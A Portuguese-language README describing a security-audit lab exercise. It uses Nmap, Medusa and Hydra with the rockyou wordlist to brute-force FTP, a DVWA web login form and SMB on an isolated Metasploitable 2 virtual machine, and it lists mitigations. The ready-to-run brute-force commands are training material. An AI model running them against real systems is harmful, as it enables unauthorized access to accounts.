# Desafio de Auditoria de Segurança com Kali Linux e Medusa

## Objetivo
Este projeto demonstra a implementação de ataques de força bruta usando o Kali Linux e a ferramenta Medusa em ambientes vulneráveis, como Metasploitable 2 e DVWA. O objetivo é identificar vulnerabilidades e propor medidas de mitigação.

## Ambiente Configurado
- **Libvirt**: Ferramenta de virtualização.
- **Kali Linux**: Utilizado para realizar os ataques.
    RAM 2GB
    VCPU 2
    Disco 40GB
    Rede Isolada 172.20.0.2
- **Metasploitable 2**: Ambiente vulnerável onde os ataques foram realizados.
    RAM 2GB
    VCPU 2
    Disco 8GB
    Rede Isolada 172.20.0.101
- **Ferramentas utilizadas**:
  - Medusa
  - Nmap
  - Wordlist rockyou(Kali)
  - hydra

## Reconhecimento

- Utilizamos o nmap para fazer o reconhecimento scaneando as portas abertas no nosso alvo **Metaspoitable 2**
`nmap -sV 172.20.0.101

Após descobrimos todas portas abertas no nosso alvo seguiremos com a proposta do desafio realizando os ataques.

## Ataques Realizados

### 1. Força Bruta no FTP
- **Comando Executado**: `medusa -h <IP-Metasploitable> -U users.txt -P /usr/share/wordlists/rockyou.txt -M ftp -t 10 | tee /tmp/acesso_ftp` 
- **Resultado**: A senha foi descoberta com sucesso após várias tentativas e acesso com credenciais.

### 2. Ataque no Formulário Web (DVWA)
- **Comando Executado**: `hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 172.20.0.101 http-post-form \
"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
-V -t 6 -f`
- **Resultado**: Senha descoberta com sucesso, acesso autorizado ao painel de administração do DVWA.

### 3. Password Spraying em SMB
- **Comando Executado**: `medusa -h 172.20.0.101 -U user.txt -P /usr/share/wordlists/rockyou.txt -M smbnt -t 2 -T 50 | tee /tmp/smb_pss.txt`
- **Resultado**: Senha descoberta e acesso a compartilhamento SMB.

## Medidas de Mitigação
- **Senhas fortes**: Implementar políticas de senha forte.
- **Autenticação multifatorial**: Usar MFA para proteção extra.
- **Proteção contra força bruta**: Implementar bloqueio de contas após várias tentativas falhas.
